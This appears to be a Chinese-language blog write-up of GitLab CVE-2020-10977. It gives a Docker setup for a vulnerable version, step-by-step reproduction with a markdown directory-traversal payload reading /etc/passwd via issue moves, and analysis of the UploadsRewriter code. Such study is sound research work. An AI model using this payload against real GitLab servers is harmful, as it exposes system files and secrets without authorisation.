---
layout: about
category: about
Researchname: GitLab CVE-2020-10977 任意文件读取漏洞
toc: true
wrench: 2022-05-05
permalink: /about/GitLab-CVE-2020-10977/
author: Bin4xin
desc: 「Gitlab」
---

## 概述

> GitLab 是一个用于仓库管理系统的开源项目，使用Git作为代码管理工具，并在此基础上搭建起来的web服务。
>
> GitLab是由GitLabInc.开发
> 
> 使用MIT许可证的基于网络的Git仓库管理工具，且具有wiki和issue跟踪功能。使用Git作为代码管理工具，并在此基础上搭建起来的web服务。

### 如何查看Gitlab Web版本

```
https://git-lab-domain.com/help
```

如果没有相关版本，那么需要先登录

![2022-04-29-11.40.26.png](https://image.yjs2635.xyz/images/2022/04/29/2022-04-29-11.40.26.png)

如果您是运维人员，可以输入以下命令查看：

```bash
$ cat /opt/gitlab/embedded/service/gitlab-rails/VERSION
12.8.1-ee
```

### 零、CVE-2020-10977

### 0x01、CVE-2020-10977 漏洞概述

在Gitlab 8.5-12.9版本中，存在一处任意文件读取漏洞，攻击者可以利用该漏洞，在不需要特权的状态下，读取任意文件，造成严重信息泄露，从而导致进一步被攻击的风险。

### 0x02、影响版本

> GitLab GitLab CE/EE >=8.5 and <=12.9
>
> GitLab GitLab CE >=8.5，<=12.9

### 0x03、环境搭建

- [*点击以查看本地搭建漏洞版本*](https://atsud0.me/2021/03/09/CVE-2020-10977%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#0x01-%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85){:target="_blank"}
- 此处不多赘述

或者Docker：Replicating the GitLab CE 12.8.1 Environment

```bash
$ sudo apt install docker.io
$ docker pull gitlab/gitlab-ce:12.8.1-ce.0
$ docker run gitlab/gitlab-ce:12.8.1-ce.0
```

> It will take few mins to run the container to start, in a new terminal we can check the docker process and 
>
> simultaneously get a shell on it.

### 0x04、漏洞复现

- 1.在首页随便创建一个账号，然后登陆；
- 2.登录后创建两个project/仓库，名字随意；
- 3.两个project创建完成后，在test1中创建一个issues。填入payload；

```markdown
![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)
```

- 4.提交后，将这个创建好的issues move到前面创建好的另外一个project/仓库中；
  - 4.1 进入issues -> 编辑 -> 移动
- 5.点击passwd附件
- 6.enjoy

![2022-04-29-11.49.15.png](https://image.yjs2635.xyz/images/2022/04/29/2022-04-29-11.49.15.png)

### 一、CVE-2020-10977 思考

- 为什么移动issues的时候，可以读取到文件呢？

### 1x01、猜测

显而易见，当创建issues的时候，我们提交上去的markdown代码被解析成了html代码，即：

```html
<img src="https://git-lab-domain.com/ysoserial/ysoserial/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd" alt="a">
```

那么问题肯定出现在代码移动时，错误解析到了本地文件上，那么是哪里呢？

带着这样的疑问，去查看了相关的文章[Hacker one- Arbitrary file read via the UploadsRewriter when moving and issue](https://hackerone.com/reports/827052){:target="_blank"}
{:target="_blank"}和代码；

### 1x02、代码分析

作者提出：

- The UploadsRewriter does not validate the file name, allowing arbitrary files to be copied via directory traversal when moving an issue to a new project.
  The pattern used to look for references is :
- `UploadsRewriter`不验证文件名，允许在将问题移动到新项目时通过目录遍历复制任意文件，寻找引用的模式如下：

```ruby
  MARKDOWN_PATTERN = %r{\!?\[.*?\]\(/uploads/(?<secret>[0-9a-f]{32})/(?<file>.*?)\)}.freeze
```

`%r` 为正则表达，用法可以参考：
- [*相关用法*](https://blog.csdn.net/weixin_30907935/article/details/94885961){:target="_blank"}

并且：

- This is used by the UploadsRewriter when copying an issue to also copy across the files:
- 在当拷贝issue时同时也能够实现能够跨文件复制，就是因为`UploadsRewriter`的使用：

```ruby
#/opt/gitlab/embedded/service/gitlab-rails/lib/gitlab/gfm/uploads_rewriter.rb:

   @text.gsub(@pattern) do |markdown|
          file = find_file(@source_project, $~[:secret], $~[:file])
          break markdown unless file.try(:exists?)

          klass = target_parent.is_a?(Namespace) ? NamespaceFileUploader : FileUploader
          moved = klass.copy_to(file, target_parent)
   ...
   def find_file(project, secret, file)
        uploader = FileUploader.new(project, secret: secret)
        uploader.retrieve_from_store!(file)
        uploader
      end
```



### 参考

- [Hacker one- Arbitrary file read via the UploadsRewriter when moving and issue](https://hackerone.com/reports/827052){:target="_blank"}
- [GitLab任意文件读取漏洞复现(CVE-2020-10977)](https://zhuanlan.zhihu.com/p/340584527/){:target="_blank"}
- [GitLab任意文件读取漏洞CVE-2020-10977](https://www.freebuf.com/vuls/235982.html){:target="_blank"}
- [HackTheBox — Laboratory Writeup](https://coldfusionx.github.io/posts/LaboratoryHTB/){:target="_blank"}
